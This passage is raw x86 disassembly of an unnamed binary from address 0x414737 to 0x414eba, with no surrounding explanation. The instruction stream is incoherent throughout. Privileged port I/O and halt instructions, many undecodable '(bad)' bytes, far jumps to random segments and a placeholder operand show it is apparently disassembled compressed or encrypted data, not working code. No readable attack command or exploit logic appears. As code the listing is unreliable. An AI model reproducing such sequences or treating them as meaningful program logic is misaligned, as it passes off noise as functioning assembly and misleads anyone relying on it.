  414737:	jnp    0x41477f
  414739:	inc    esi
  41473a:	or     al,0xa6
  41473c:	ret    0x9190
  41473f:	mov    DWORD PTR [ebx-0x566a2514],ebx
  414745:	stos   BYTE PTR es:[edi],al
  414746:	push   esp
  414747:	push   eax
  414748:	pop    edx
  414749:	nop
  41474a:	cmp    ebx,DWORD PTR [esi-0x33]
  41474d:	daa    
  41474e:	out    dx,eax
  41474f:	adc    DWORD PTR [edx],0x808336f6
  414755:	test   DWORD PTR [eax+0x7d],ebx
  414758:	jo     0x41478b
  41475a:	test   esi,ebx
  41475c:	push   esp
  41475d:	jg     0x41470e
  41475f:	je     0x414755
  414761:	ins    BYTE PTR es:[edi],dx
  414762:	cwde   
  414763:	(bad)  
  414765:	or     ebp,edx
  414767:	or     dh,ch
  414769:	fsubr  QWORD PTR [eax+0xd2bd194]
  41476f:	cs jno 0x4147c7
  414772:	out    0x6d,eax
  414774:	or     DWORD PTR [eax+0x24e11f23],esi
  41477a:	cmp    BYTE PTR [ebx-0x31],bh
  41477d:	mov    eax,ds:0xd3a967eb
  414782:	iret   
  414783:	jge    0x4147e1
  414785:	push   ecx
  414786:	out    0x9f,al
  414788:	xchg   esi,eax
  414789:	or     ch,BYTE PTR [ebp-0x5c]
  41478c:	or     BYTE PTR [ebx-0x22a8a24d],ah
  414792:	push   ebp
  414793:	sub    dh,BYTE PTR [eax]
  414795:	addr16 pushf 
  414797:	int3   
  414798:	dec    ecx
  414799:	sub    ecx,DWORD PTR [eax-0x33310eb4]
  41479f:	scas   eax,DWORD PTR es:[edi]
  4147a0:	out    dx,eax
  4147a1:	neg    BYTE PTR [ebx-0x5d6bb301]
  4147a7:	push   0x843b20f7
  4147ac:	cmp    al,0x49
  4147ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147af:	push   esi
  4147b0:	push   0x3
  4147b2:	fisubr DWORD PTR [edi]
  4147b4:	push   0xab95545c
  4147b9:	xchg   edi,eax
  4147ba:	enter  0x9911,0xd7
  4147be:	add    DWORD PTR [edi+0x7],ecx
  4147c1:	std    
  4147c2:	inc    esp
  4147c3:	leave  
  4147c4:	pop    esp
  4147c5:	icebp  
  4147c6:	mov    ebp,?
  4147c8:	adc    al,0x6c
  4147ca:	dec    ecx
  4147cb:	xor    BYTE PTR [ebx-0x6e],bl
  4147ce:	hlt    
  4147cf:	dec    DWORD PTR [ebx+0x52a16699]
  4147d5:	adc    BYTE PTR [eax],ch
  4147d7:	or     ch,0xc6
  4147da:	dec    eax
  4147db:	lea    edi,[ebp+0x3fac2379]
  4147e1:	pop    es
  4147e2:	out    dx,al
  4147e3:	mov    cl,0x30
  4147e5:	ins    DWORD PTR es:[edi],dx
  4147e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147e7:	lods   eax,DWORD PTR ds:[esi]
  4147e8:	xchg   edx,eax
  4147e9:	jnp    0x414789
  4147eb:	cmp    BYTE PTR [esi],bh
  4147ed:	test   DWORD PTR [esi+edx*8+0x3d],ebx
  4147f1:	aad    0x7c
  4147f3:	cmp    al,0xf6
  4147f5:	jno    0x4147ac
  4147f7:	push   ecx
  4147f8:	int3   
  4147f9:	sub    bh,BYTE PTR [esi+0x1]
  4147fc:	test   esp,ecx
  4147fe:	stc    
  4147ff:	bnd jne 0x414801
  414802:	inc    edx
  414803:	or     DWORD PTR [ebx+edx*1-0x32],esp
  414807:	or     DWORD PTR [ebx+edx*2-0x38104bd4],esi
  41480e:	inc    ebp
  41480f:	and    eax,0xe3f7718d
  414814:	push   ecx
  414815:	xchg   DWORD PTR [ebx],edx
  414817:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414818:	mov    ds:0x69a51ed9,eax
  41481d:	push   ebp
  41481e:	ins    BYTE PTR es:[edi],dx
  41481f:	test   eax,0xd6a336c4
  414824:	imul   ecx,esi,0x9f141010
  41482a:	ins    BYTE PTR es:[edi],dx
  41482b:	loop   0x414894
  41482d:	mov    ah,0x53
  41482f:	pusha  
  414830:	cmp    edx,esp
  414832:	std    
  414833:	sub    eax,0xb598d2b1
  414838:	aaa    
  414839:	dec    ebx
  41483a:	mov    ch,0x8d
  41483c:	add    DWORD PTR [esi],eax
  41483e:	pop    ecx
  41483f:	pop    edi
  414840:	cmp    eax,0x46d565e2
  414845:	xchg   bh,al
  414847:	and    al,0xaf
  414849:	(bad)  
  41484a:	jbe    0x414842
  41484c:	popa   
  41484d:	or     al,0xe8
  41484f:	iret   
  414850:	jmp    0x8f2077c7
  414855:	jecxz  0x414866
  414857:	repz out 0xcc,eax
  41485a:	rol    ch,0x6c
  41485d:	pop    es
  41485e:	in     al,0x63
  414860:	or     esi,DWORD PTR [eax+esi*1+0x65]
  414864:	push   cs
  414865:	pop    es
  414866:	cmp    ecx,edi
  414868:	out    dx,eax
  414869:	jl     0x414857
  41486b:	dec    esi
  41486c:	pushf  
  41486d:	pop    ecx
  41486e:	sub    DWORD PTR ds:0x5e6ab391,edx
  414874:	rcl    ebp,0x75
  414877:	inc    esp
  414878:	xchg   ecx,esp
  41487a:	out    dx,eax
  41487b:	pop    ds
  41487c:	adc    al,0xc1
  41487e:	jns    0x4148fa
  414880:	jmp    0x53fd:0xd3ef4814
  414887:	xchg   esp,eax
  414888:	popa   
  414889:	pop    ebp
  41488a:	mov    al,ds:0xcb2cc60c
  41488f:	out    dx,al
  414890:	repz jo 0x414889
  414893:	or     bh,BYTE PTR [ebx+0x6b4cadde]
  414899:	stos   BYTE PTR es:[edi],al
  41489a:	xchg   ebx,eax
  41489b:	fldcw  WORD PTR [edi]
  41489d:	dec    ebx
  41489e:	cmp    al,0xf1
  4148a0:	stos   BYTE PTR es:[edi],al
  4148a1:	int3   
  4148a2:	(bad)  
  4148a3:	fmul   QWORD PTR [esi-0x791bf2f6]
  4148a9:	jns    0x4148d4
  4148ab:	not    bl
  4148ad:	popf   
  4148ae:	in     eax,0xb2
  4148b0:	loopne 0x4148c3
  4148b2:	inc    esi
  4148b3:	not    BYTE PTR [ecx+0xd]
  4148b6:	(bad)  
  4148b7:	lds    esp,FWORD PTR [esi]
  4148b9:	cli    
  4148ba:	xchg   esi,eax
  4148bb:	push   0x45cbdd72
  4148c0:	shr    esp,0xe3
  4148c3:	mov    esp,0xbb8bced4
  4148c8:	ss neg bh
  4148cb:	mov    dl,cl
  4148cd:	rol    BYTE PTR [eax],1
  4148cf:	mov    ebp,0xa8811067
  4148d4:	dec    edx
  4148d5:	data16 mov dl,0xe7
  4148d8:	arpl   WORD PTR [ecx-0x34],bp
  4148db:	mov    dl,0x51
  4148dd:	retf   
  4148de:	pop    ss
  4148df:	loopne 0x4148e6
  4148e1:	test   BYTE PTR [ecx-0x38],cl
  4148e4:	les    ebp,FWORD PTR [edx+0x5e0474d8]
  4148ea:	outs   dx,DWORD PTR ds:[esi]
  4148eb:	sbb    al,0x93
  4148ed:	xchg   ebx,eax
  4148ee:	shr    DWORD PTR [ecx+0x16],1
  4148f1:	xor    BYTE PTR [edx-0x3eaa11eb],dl
  4148f7:	push   esi
  4148f8:	push   esp
  4148f9:	test   al,0xe2
  4148fb:	ins    BYTE PTR es:[edi],dx
  4148fc:	jae    0x41493e
  4148fe:	push   0xc9b76da9
  414903:	add    DWORD PTR [edx+0x3385c9f6],esi
  414909:	sub    BYTE PTR [esi-0x2a],0x8d
  41490d:	xchg   esi,eax
  41490e:	div    DWORD PTR [ebx]
  414910:	(bad)
  414913:	xchg   ebp,eax
  414914:	and    DWORD PTR [eax-0x512401de],ebp
  41491a:	stos   DWORD PTR es:[edi],eax
  41491b:	fisub  DWORD PTR [ebp+eax*8+0x77]
  41491f:	xor    DWORD PTR [edi+0x27],ebx
  414922:	xlat   BYTE PTR ds:[ebx]
  414923:	pop    esp
  414924:	sti    
  414925:	loop   0x4148df
  414927:	jge    0x4148eb
  414929:	test   BYTE PTR [esi+0x19],dh
  41492c:	shr    cl,cl
  41492e:	cmp    DWORD PTR [ebx-0xd],esp
  414931:	out    0x54,eax
  414933:	pop    es
  414934:	push   esi
  414935:	outs   dx,BYTE PTR ds:[esi]
  414936:	mov    gs,WORD PTR fs:[ebx+0x13]
  41493a:	push   ebx
  41493b:	mov    esi,DWORD PTR [esi]
  41493d:	ss popa 
  41493f:	sbb    esi,esi
  414941:	mov    al,0xe3
  414943:	fsub   QWORD PTR ds:0x337e1a00
  414949:	cmp    BYTE PTR [edx-0x26],bl
  41494c:	push   esi
  41494d:	out    0xd7,al
  41494f:	jns    0x12cb2d62
  414955:	out    dx,eax
  414956:	pop    edx
  414957:	ins    DWORD PTR es:[edi],dx
  414958:	or     BYTE PTR [ecx-0x5ea93c0],dh
  41495e:	pop    eax
  41495f:	ja     0x414946
  414961:	dec    ecx
  414962:	or     bl,BYTE PTR [ecx+0x636bc34f]
  414968:	xor    BYTE PTR [esi+0x1e458904],al
  41496e:	xchg   edi,eax
  41496f:	ins    DWORD PTR es:[edi],dx
  414970:	mov    ebx,DWORD PTR [esi]
  414972:	pusha  
  414973:	mov    esi,0x36b0e15d
  414978:	jl     0x4149ba
  41497a:	adc    al,0x21
  41497c:	fiadd  DWORD PTR [eax]
  41497e:	jmp    0xd00a:0x1df07afa
  414985:	(bad)  [ecx-0x646407d7]
  41498b:	rcl    BYTE PTR [ebx],cl
  41498d:	xor    BYTE PTR [esi],bh
  41498f:	mov    al,0x4e
  414991:	cs push eax
  414993:	outs   dx,BYTE PTR ds:[esi]
  414994:	pop    eax
  414995:	test   DWORD PTR [esi+edx*4],eax
  414998:	xchg   edi,ecx
  41499a:	hlt    
  41499b:	dec    ebp
  41499c:	cmp    ebp,DWORD PTR [eax+0x28]
  41499f:	cmp    al,0xa3
  4149a1:	sti    
  4149a2:	sbb    DWORD PTR [edx],eax
  4149a4:	xchg   BYTE PTR [ebx+esi*1+0x16],dh
  4149a8:	mov    WORD PTR [eax-0x7c],gs
  4149ab:	push   ebp
  4149ac:	fcmovnbe st,st(5)
  4149ae:	dec    eax
  4149af:	aad    0x7e
  4149b1:	lea    edi,[esi+0xefdf112]
  4149b7:	sar    BYTE PTR [ecx-0x3bc1f8cd],cl
  4149bd:	gs mov bh,0x71
  4149c0:	mov    esi,0x6d35da2f
  4149c5:	push   edi
  4149c6:	mov    al,0xd9
  4149c8:	aaa    
  4149c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149ca:	mov    ecx,0x55d8062d
  4149cf:	pop    ss
  4149d0:	mov    ds:0xe2b95d0e,eax
  4149d5:	jbe    0x4149df
  4149d7:	pop    ecx
  4149d8:	sbb    eax,0x55e5a34a
  4149dd:	retf   
  4149de:	xchg   edi,eax
  4149df:	sahf   
  4149e0:	pop    ebp
  4149e1:	push   0x55
  4149e3:	ja     0x414a56
  4149e5:	leave  
  4149e6:	imul   ecx,DWORD PTR [ebp+0x37],0xffffff8b
  4149ea:	dec    ecx
  4149eb:	mov    edi,0x6406211b
  4149f0:	ret    0xf5ad
  4149f3:	jo     0x414a07
  4149f5:	add    BYTE PTR [ebx+0x76],0xa8
  4149f9:	dec    edx
  4149fa:	mov    ebp,fs
  4149fc:	push   ebp
  4149fd:	push   edx
  4149fe:	aas    
  4149ff:	dec    eax
  414a00:	xchg   cl,al
  414a02:	int    0x4
  414a04:	inc    eax
  414a05:	dec    ebp
  414a06:	pop    ebp
  414a07:	mov    eax,ds:0x819861b6
  414a0c:	lods   al,BYTE PTR ds:[esi]
  414a0d:	ins    BYTE PTR es:[edi],dx
  414a0e:	dec    esi
  414a0f:	in     eax,dx
  414a10:	aad    0xf4
  414a12:	ffree  st(1)
  414a14:	scas   al,BYTE PTR es:[edi]
  414a15:	out    dx,eax
  414a16:	push   edi
  414a17:	push   ss
  414a18:	inc    edi
  414a19:	mov    ch,0x98
  414a1b:	pusha  
  414a1c:	sbb    al,0x79
  414a1e:	inc    ebx
  414a1f:	mov    bl,0x39
  414a21:	sbb    BYTE PTR [bp-0x78ac],0x7a
  414a27:	xchg   edi,eax
  414a28:	js     0x4149bc
  414a2a:	adc    eax,0xdfea3eda
  414a2f:	cs jo  0x4149f1
  414a32:	sti    
  414a33:	mov    eax,DWORD PTR [edx]
  414a35:	mov    cl,0x6d
  414a37:	pop    esp
  414a38:	(bad)  
  414a39:	into   
  414a3a:	and    ch,0xe4
  414a3d:	xchg   esp,eax
  414a3e:	ror    DWORD PTR [edx],0xe9
  414a41:	outs   dx,BYTE PTR ds:[esi]
  414a42:	dec    edx
  414a43:	fnstcw WORD PTR [ecx+0xf59de38]
  414a49:	mov    bl,0xcc
  414a4b:	neg    DWORD PTR [ebp+0x21053d90]
  414a51:	mov    al,dh
  414a53:	xlat   BYTE PTR ds:[ebx]
  414a54:	pusha  
  414a55:	and    al,0x21
  414a57:	adc    al,0x3e
  414a59:	(bad)  
  414a5a:	mov    ah,0xdd
  414a5c:	test   DWORD PTR [edx-0x9dfe9d1],edi
  414a62:	mov    ds:0xfcc59ac2,al
  414a67:	pop    edi
  414a68:	test   BYTE PTR ss:[bp+si+0x45],bh
  414a6d:	sar    DWORD PTR [edi-0x51],0x94
  414a71:	jb     0x414a23
  414a73:	dec    esi
  414a74:	call   FWORD PTR ds:0xbac988a3
  414a7a:	ror    BYTE PTR [eax+0x68],1
  414a7d:	inc    DWORD PTR [edi-0x11a3c6d2]
  414a83:	imul   eax,DWORD PTR [ecx-0x51],0xb748be8e
  414a8a:	lods   eax,DWORD PTR ds:[esi]
  414a8b:	cmc    
  414a8c:	adc    BYTE PTR [edi-0x7f],ah
  414a8f:	xchg   esp,eax
  414a90:	inc    esi
  414a91:	imul   ebx,DWORD PTR [esp+ebx*4],0x68ce9c11
  414a98:	cmc    
  414a99:	or     esi,edx
  414a9b:	imul   esp,DWORD PTR [eax-0x72],0xffffff9b
  414a9f:	sub    eax,0xba6c9889
  414aa4:	jne    0x414a54
  414aa6:	cmp    BYTE PTR [eax+0x7e7e8789],dl
  414aac:	mov    ebx,0xf657b5bc
  414ab1:	int    0xa1
  414ab3:	cld    
  414ab4:	sbb    eax,0x241f5b31
  414ab9:	push   ecx
  414aba:	scas   al,BYTE PTR es:[edi]
  414abb:	pop    esp
  414abc:	or     esi,DWORD PTR [eax-0xe6c6cc5]
  414ac2:	test   BYTE PTR [ebx],bl
  414ac4:	sub    DWORD PTR [edi+0x4e],esi
  414ac7:	xchg   edi,eax
  414ac8:	pop    es
  414ac9:	lea    ebx,[edi+0x6c]
  414acc:	scas   al,BYTE PTR es:[edi]
  414acd:	inc    ebp
  414ace:	shl    DWORD PTR [edx],1
  414ad0:	xchg   ebx,eax
  414ad1:	dec    eax
  414ad2:	jmp    0x4fab6b6
  414ad7:	jno    0x414ac1
  414ad9:	dec    edi
  414ada:	push   0xe4ffd55e
  414adf:	inc    edi
  414ae0:	inc    edi
  414ae1:	aaa    
  414ae2:	pop    es
  414ae3:	and    eax,0x213f4d5c
  414ae8:	mov    ds:0x3eefd52d,al
  414aed:	add    ebp,ebx
  414aef:	imul   edi,ecx,0x68
  414af2:	jns    0x414a85
  414af4:	jnp    0x414b60
  414af6:	cmp    ecx,DWORD PTR [edx+ebx*8-0x2a]
  414afa:	pop    eax
  414afb:	sbb    BYTE PTR [bp+di-0xf7d],ah
  414b00:	pop    eax
  414b01:	nop
  414b02:	rcr    BYTE PTR [edx+ebp*8],1
  414b05:	xchg   esi,eax
  414b06:	jbe    0x414a9e
  414b08:	rcr    BYTE PTR [edi-0x4ef647af],cl
  414b0e:	(bad)  
  414b0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b10:	sub    ch,BYTE PTR [edx]
  414b12:	push   cs
  414b13:	xchg   ebp,eax
  414b14:	fwait
  414b15:	mov    esi,ecx
  414b17:	ffree  st(3)
  414b19:	lock lds eax,FWORD PTR [eax-0x2b]
  414b1d:	xor    al,0x97
  414b1f:	or     edx,edx
  414b21:	add    ch,BYTE PTR [esi-0xc]
  414b24:	pop    es
  414b25:	retf   
  414b26:	repz call 0x9c2fdbeb
  414b2c:	ret    
  414b2d:	and    eax,edx
  414b2f:	call   0x4ce0:0x9f21a605
  414b36:	sbb    al,0xc4
  414b38:	mov    WORD PTR ds:0xe753ec15,ds
  414b3e:	jmp    0x4999:0x21c164a1
  414b45:	adc    DWORD PTR [eax],edx
  414b47:	push   0x4966c6ff
  414b4c:	loopne 0x414b14
  414b4e:	mov    esi,0x8071fb7f
  414b53:	ds or  eax,0xe94d77d7
  414b59:	clc    
  414b5a:	cld    
  414b5b:	mov    al,0xbc
  414b5d:	cmp    eax,0x4fcc9c42
  414b62:	sub    eax,DWORD PTR [eax]
  414b64:	jae    0x414b29
  414b66:	aad    0xdd
  414b68:	lods   al,BYTE PTR gs:[esi]
  414b6a:	xchg   edx,eax
  414b6b:	sbb    eax,0x9def5df
  414b70:	jge    0x414b6c
  414b72:	add    al,0xda
  414b74:	fsubp  st(4),st
  414b76:	fst    DWORD PTR [edx]
  414b78:	jnp    0x414b85
  414b7a:	gs enter 0x1a4d,0x65
  414b7f:	mov    WORD PTR [edx-0xb81e249],cs
  414b85:	ffreep st(7)
  414b87:	ficomp WORD PTR [edi+0x2baffbb5]
  414b8d:	adc    DWORD PTR [esi],0xffffffee
  414b90:	add    BYTE PTR [edx],al
  414b92:	sbb    BYTE PTR [edx+0x1c42cfef],ah
  414b98:	leave  
  414b99:	pop    es
  414b9a:	test   eax,0xb4c44dda
  414b9f:	xchg   esp,eax
  414ba0:	mov    esi,0x818ae9b2
  414ba5:	bound  eax,QWORD PTR [ecx+0x12]
  414ba8:	pop    ebp
  414ba9:	cmp    eax,0x91757f
  414bae:	mov    ds:0x8edc900a,al
  414bb3:	inc    eax
  414bb4:	lahf   
  414bb5:	or     ebx,ebp
  414bb7:	inc    edx
  414bb8:	loope  0x414bc7
  414bba:	scas   eax,DWORD PTR es:[edi]
  414bbb:	lock les edx,FWORD PTR [ebx+0xcd9775e]
  414bc2:	jmp    0xcfa5:0x4ea901e7
  414bc9:	icebp  
  414bca:	jo     0x414c19
  414bcc:	loop   0x414bdd
  414bce:	lea    esp,cs:[esi]
  414bd1:	popa   
  414bd2:	or     al,dh
  414bd4:	repnz mov bh,0x46
  414bd7:	push   cs
  414bd8:	nop
  414bd9:	je     0x414c3f
  414bdb:	cmp    ah,BYTE PTR [ebp+ebx*4+0x6e]
  414bdf:	jae    0x414bd3
  414be1:	pop    ebp
  414be2:	imul   ebp,DWORD PTR [edi],0xffffffb7
  414be5:	add    edi,DWORD PTR [ebp+0x2c]
  414be8:	push   cs
  414be9:	sahf   
  414bea:	xchg   ecx,eax
  414beb:	mov    ds:0x3acb2fd6,al
  414bf0:	push   0xfffffffe
  414bf2:	jb     0x414bdd
  414bf4:	ins    DWORD PTR es:[edi],dx
  414bf5:	push   ds
  414bf6:	out    dx,eax
  414bf7:	dec    edi
  414bf8:	xor    eax,0x879c4f55
  414bfd:	gs test eax,0x4468fb49
  414c03:	or     DWORD PTR [ebp+eiz*2-0x16978866],0x2d
  414c0b:	dec    edx
  414c0c:	test   BYTE PTR [eax],0xbb
  414c0f:	xlat   BYTE PTR ds:[ebx]
  414c10:	sub    al,0xa3
  414c12:	popa   
  414c13:	xchg   ecx,eax
  414c14:	mov    dl,0x7c
  414c16:	inc    edx
  414c17:	es jnp 0x414c5c
  414c1a:	pop    esp
  414c1b:	and    eax,0xb590f0cc
  414c20:	jae    0x414c7d
  414c22:	jp     0x414c3f
  414c24:	xchg   ecx,eax
  414c25:	mov    dl,0xbc
  414c27:	hlt    
  414c28:	mov    eax,ds:0xc6f46cd
  414c2d:	js     0x414c32
  414c2f:	js     0x414c09
  414c31:	hlt    
  414c32:	or     ebx,ebx
  414c34:	dec    ebp
  414c35:	aas    
  414c36:	test   al,0x39
  414c38:	sti    
  414c39:	xchg   edi,eax
  414c3a:	mov    dl,0x8a
  414c3c:	ret    0x2ee9
  414c3f:	fwait
  414c40:	mov    edi,0xe9b42f32
  414c45:	popa   
  414c46:	add    al,0xd9
  414c48:	ins    DWORD PTR es:[edi],dx
  414c49:	xor    al,0xe0
  414c4b:	(bad)  
  414c4c:	cwde   
  414c4d:	je     0x414c2d
  414c4f:	je     0x414c46
  414c51:	aad    0xfd
  414c53:	(bad)  
  414c54:	jmp    0x2c8b:0x65397ad2
  414c5b:	push   cs
  414c5c:	cmp    al,BYTE PTR [ecx+ecx*1-0x3a]
  414c60:	les    ebx,FWORD PTR [ebx]
  414c62:	lock inc ecx
  414c64:	jns    0x414cb5
  414c66:	xlat   BYTE PTR ds:[ebx]
  414c67:	jo     0x414c71
  414c69:	retf   
  414c6a:	jne    0x414c3c
  414c6c:	fsubp  st(3),st
  414c6e:	mov    esi,0x915dc49d
  414c73:	jne    0x414cbe
  414c75:	mov    ah,0xa
  414c77:	xor    eax,esp
  414c79:	mov    al,0x6b
  414c7b:	xchg   DWORD PTR [ecx-0x32],esp
  414c7e:	lds    ebp,FWORD PTR [edi+0x53bea786]
  414c84:	clc    
  414c85:	mov    dh,0x35
  414c87:	fimul  DWORD PTR [edi]
  414c89:	cmp    edx,eax
  414c8b:	popf   
  414c8c:	mov    ch,0xa1
  414c8e:	stc    
  414c8f:	cld    
  414c90:	dec    edx
  414c91:	add    eax,0x16aae9ec
  414c96:	xor    eax,0xb56d731
  414c9b:	add    al,0x23
  414c9d:	out    0x9e,al
  414c9f:	in     eax,0xa2
  414ca1:	loop   0x414cf4
  414ca3:	xlat   BYTE PTR ds:[ebx]
  414ca4:	jl     0x414c92
  414ca6:	sub    ebx,DWORD PTR [edi+0x73]
  414ca9:	lsl    esi,WORD PTR [ebx+0x235f3407]
  414cb0:	imul   ebp,ebx,0x16
  414cb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414cb4:	push   ss
  414cb5:	sahf   
  414cb6:	and    eax,0x9b53c573
  414cbb:	jg     0x414d22
  414cbd:	cmp    eax,0xa64518ec
  414cc2:	sub    DWORD PTR [ebx*1+0x339d0a88],edx
  414cc9:	(bad)  
  414cca:	addr16 aam 0x2a
  414ccd:	mov    edi,DWORD PTR [edi-0x99a79ca]
  414cd3:	pusha  
  414cd4:	outs   dx,DWORD PTR ds:[esi]
  414cd5:	aad    0x62
  414cd7:	cmp    edx,esi
  414cd9:	retf   
  414cda:	and    eax,0xb1e6db62
  414cdf:	inc    ebx
  414ce0:	xchg   ebp,eax
  414ce1:	jbe    0x414ce0
  414ce3:	lea    esp,[esi-0x1be9d972]
  414ce9:	adc    BYTE PTR [edi],cl
  414ceb:	push   edx
  414cec:	je     0x414d39
  414cee:	inc    edi
  414cef:	stos   DWORD PTR es:[edi],eax
  414cf0:	sub    ah,BYTE PTR [edi]
  414cf2:	xor    ch,bl
  414cf4:	dec    edx
  414cf5:	fiadd  DWORD PTR [edi]
  414cf7:	daa    
  414cf8:	add    eax,0xb7913290
  414cfd:	stc    
  414cfe:	jnp    0x414cd5
  414d00:	mov    ebx,0xc1fffdcc
  414d05:	inc    edx
  414d06:	jnp    0x414cb6
  414d08:	xor    BYTE PTR [eax+edx*4+0xce5932e],0xfe
  414d10:	(bad)  
  414d11:	sahf   
  414d12:	call   0x75800332
  414d17:	dec    eax
  414d18:	xchg   esp,eax
  414d19:	out    0x5c,eax
  414d1b:	fs lahf 
  414d1d:	loopne 0x414d5d
  414d1f:	dec    ebx
  414d20:	jl     0x414d05
  414d22:	ins    BYTE PTR es:[edi],dx
  414d23:	ret    
  414d24:	cwde   
  414d25:	or     ecx,DWORD PTR [eax+0x1cf4c02f]
  414d2b:	xor    al,0xae
  414d2d:	ficom  DWORD PTR [edi+edx*1]
  414d30:	mov    bl,0x65
  414d32:	hlt    
  414d33:	sub    DWORD PTR [edx-0xb],ecx
  414d36:	mov    edx,eax
  414d38:	cmp    DWORD PTR [edi],esp
  414d3a:	js     0x414d52
  414d3c:	in     al,dx
  414d3d:	dec    esp
  414d3e:	call   0x5c1e513a
  414d43:	sbb    DWORD PTR [edi],esi
  414d45:	fsub   DWORD PTR [ecx-0x3afc7fe9]
  414d4b:	xor    BYTE PTR [ebx+0x1],0xde
  414d4f:	retf   
  414d50:	dec    ebx
  414d51:	(bad)  
  414d52:	mov    DWORD PTR [edx-0x31],esp
  414d55:	cwde   
  414d56:	push   ds
  414d57:	ret    0x54b0
  414d5a:	inc    esp
  414d5b:	and    BYTE PTR [edi],0x84
  414d5e:	cmp    eax,0x42046ad9
  414d63:	cmp    DWORD PTR [ebx],0x20
  414d66:	enter  0x115b,0x93
  414d6a:	mov    ecx,0x350706a7
  414d6f:	pop    edi
  414d70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d71:	sub    eax,0xc41e9121
  414d76:	fwait
  414d77:	mov    BYTE PTR [edx+ebx*8],cl
  414d7a:	addr16 (bad) 
  414d7c:	pushf  
  414d7d:	nop
  414d7e:	(bad)  
  414d7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d80:	cld    
  414d81:	mov    ds:0x9caa5d05,eax
  414d86:	outs   dx,BYTE PTR ds:[esi]
  414d87:	jmp    0x414d2b
  414d89:	test   DWORD PTR [esi+0x19a873ee],0x685e0e5e
  414d93:	in     eax,0x13
  414d95:	mov    cl,0xdb
  414d97:	inc    eax
  414d98:	fsubr  DWORD PTR [esi-0x3a]
  414d9b:	stc    
  414d9c:	cmp    ebx,DWORD PTR [edi+edx*8-0xc]
  414da0:	retf   0xae63
  414da3:	sbb    BYTE PTR [ebx-0x2f1d9fb6],0xac
  414daa:	add    DWORD PTR [eax],0x1d3e5ae5
  414db0:	jmp    0xb476:0x8b6c61d8
  414db7:	inc    edx
  414db8:	call   FWORD PTR [ecx-0x3385564]
  414dbe:	(bad)  
  414dbf:	hlt    
  414dc0:	jecxz  0x414e36
  414dc2:	sub    BYTE PTR gs:[edx+0x70e3cf53],dh
  414dc9:	sbb    eax,0x32da3c4
  414dce:	xor    dl,BYTE PTR [ebx]
  414dd0:	ror    DWORD PTR [edi],0x20
  414dd3:	mov    eax,0x29510d89
  414dd8:	pop    esp
  414dd9:	std    
  414dda:	in     eax,0x6f
  414ddc:	add    BYTE PTR [esi],dh
  414dde:	push   ss
  414ddf:	push   ebx
  414de0:	sbb    al,0xc7
  414de2:	mov    ebp,0x332c308c
  414de7:	in     eax,0x75
  414de9:	and    BYTE PTR [eax-0x5520f173],cl
  414def:	and    bl,ah
  414df1:	dec    ebx
  414df2:	das    
  414df3:	or     al,0xfb
  414df5:	and    DWORD PTR [ecx+esi*8],edi
  414df8:	ins    DWORD PTR es:[edi],dx
  414df9:	adc    ebx,DWORD PTR [edx+ebx*2-0x29]
  414dfd:	loope  0x414e7c
  414dff:	bound  esi,QWORD PTR [ebx]
  414e01:	mov    eax,ds:0x908d11d1
  414e06:	(bad)  
  414e07:	pop    ebp
  414e08:	push   es
  414e09:	adc    ebx,DWORD PTR ds:0x1f7fbdef
  414e0f:	mov    dh,al
  414e11:	push   es
  414e12:	dec    eax
  414e13:	or     ch,cl
  414e15:	pusha  
  414e16:	das    
  414e17:	mov    ebx,0x3248151f
  414e1c:	mov    edx,0xeadd595b
  414e21:	xlat   BYTE PTR ds:[ebx]
  414e22:	pop    edi
  414e23:	stos   DWORD PTR es:[edi],eax
  414e24:	add    esp,DWORD PTR ds:0xe322a6ca
  414e2a:	lods   eax,DWORD PTR ds:[esi]
  414e2b:	dec    eax
  414e2c:	mov    al,0x4a
  414e2e:	lods   eax,DWORD PTR ds:[esi]
  414e2f:	sbb    al,0x9f
  414e31:	cwde   
  414e32:	das    
  414e33:	cs xchg ebx,eax
  414e35:	in     al,dx
  414e36:	fstp   QWORD PTR [eax+0x72]
  414e39:	jge    0x414e32
  414e3b:	xchg   edx,eax
  414e3c:	out    dx,al
  414e3d:	jmp    FWORD PTR [ebx+0xa]
  414e40:	scas   eax,DWORD PTR es:[edi]
  414e41:	fstp   st(3)
  414e43:	inc    esp
  414e44:	mov    ds:0xaca6b07f,al
  414e49:	cli    
  414e4a:	mov    edx,0x2dff6559
  414e4f:	pop    ebp
  414e50:	mov    ecx,0x4284d43d
  414e55:	in     al,dx
  414e56:	sbb    al,BYTE PTR [ecx+0x51]
  414e59:	or     eax,0x7f7d7549
  414e5e:	mov    cl,al
  414e60:	outs   dx,BYTE PTR ds:[esi]
  414e61:	mov    ebp,0x8e984172
  414e66:	mov    al,0x2b
  414e68:	sbb    ah,BYTE PTR [ebx-0x1e]
  414e6b:	ja     0x414eb2
  414e6d:	or     al,BYTE PTR [ecx+0x5120647a]
  414e73:	xchg   ecx,eax
  414e74:	call   0xde83:0xf5466101
  414e7b:	jl     0x414e46
  414e7d:	and    esp,DWORD PTR [edx+0x16]
  414e80:	push   ecx
  414e81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e82:	repz pop ebp
  414e84:	jbe    0x414e31
  414e86:	test   bl,cl
  414e88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e89:	out    0x3b,al
  414e8b:	adc    DWORD PTR [eax-0x657638aa],esi
  414e91:	scas   al,BYTE PTR es:[edi]
  414e92:	loopne 0x414edb
  414e94:	add    ebp,esp
  414e96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e97:	sub    eax,0x2096c759
  414e9c:	hlt    
  414e9d:	mov    al,0x7e
  414e9f:	cld    
  414ea0:	fdivr  QWORD PTR [ebx+0x54371ffb]
  414ea6:	push   es
  414ea7:	scas   eax,DWORD PTR es:[edi]
  414ea8:	cld    
  414ea9:	add    al,BYTE PTR [ebp-0x51e48b5d]
  414eaf:	sbb    BYTE PTR [ecx-0x41],0x61
  414eb3:	loope  0x414e3d
  414eb5:	int    0xf0
  414eb7:	(bad)  
  414eb8:	push   0x16
  414eba:	iret   
